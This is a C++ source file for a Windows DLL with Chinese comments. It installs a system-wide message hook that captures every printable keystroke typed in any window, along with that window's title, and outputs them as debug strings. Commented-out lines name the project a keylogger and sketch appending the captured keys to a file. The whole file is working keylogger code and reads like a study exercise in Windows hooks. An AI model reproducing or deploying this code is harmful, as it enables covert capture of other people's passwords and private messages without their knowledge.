// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include<Windows.h>
#include<iostream>

HHOOK g_hHooK = nullptr;
HINSTANCE g_hInstance = nullptr;

LRESULT CALLBACK MsgHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (HC_ACTION == nCode)//用消息到来
	{

		PMSG pMsg = (PMSG)lParam;
		//WM_IME_******可以设置接受其他字符 比如汉语
		
		
		//消息分类 工具SPY++查看
		if (WM_CHAR == pMsg->message)
		{
			//	此时确定已经有键按下 存在pMsg结构体wParam中
			char szKey = (char)pMsg->wParam;//接受键盘上的所有消息
			//自身无窗口 所以即使输出也看不到
			//有效的消息在32-126之间 
			if (szKey >= 32 && szKey <= 126)
			{
				char szWindowName[MAXBYTE] = { 0 };
				char szDebug[MAXBYTE] = { 0 };
				//char szaccept[MAXBYTE] = "E:\\rubbish\\键盘记录器1\\键盘记录器1\\1.txt";
				//char cmd[MAXBYTE];
				GetWindowTextA(pMsg->hwnd, szWindowName, MAXBYTE);
				//看出调试输出的数据
				//所有获取的消息都会在DebugView下显示 
				sprintf_s(szDebug,MAXBYTE,"窗口名:%s接收到了一个：%c",szWindowName,szKey);
				//sprintf(cmd,"echo %s>>%s",szKey,szaccept);
				OutputDebugStringA(szDebug);
			}
			//std::cout << szKey << std::endl;
		}
	}

	//返回通信
	return CallNextHookEx(g_hHooK, nCode, wParam, lParam);
}

extern "C"  //防止命名粉碎？
_declspec(dllexport) BOOL StartHook()
{
	//回调函数 Hook已经Hook好 只等上钩
	g_hHooK = SetWindowsHookEx(WH_GETMESSAGE, MsgHookProc, g_hInstance, NULL);
	if (nullptr == g_hHooK)
	{
		//错误查找 工具菜单下 ..
		SetLastError(GetLastError());
		return FALSE;
	}            
	return TRUE;
}


//HOOK完一定要释放
BOOL UnHook()
{
	if (g_hHooK)
	{
		return UnhookWindowsHookEx(g_hHooK);
	}
	return FALSE; 
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:	//当DLL被加载到进程时触发  依附于进程
		g_hInstance = hModule;
		break;
	case DLL_THREAD_ATTACH:		//DLL被线程运行时触发
	case DLL_THREAD_DETACH:		//DLL被线程运行完成时触发 运行于线程
	case DLL_PROCESS_DETACH:	//DLL从进程剥离时整个进程结束触发
		UnHook();
		break;
	}
	return TRUE;
}

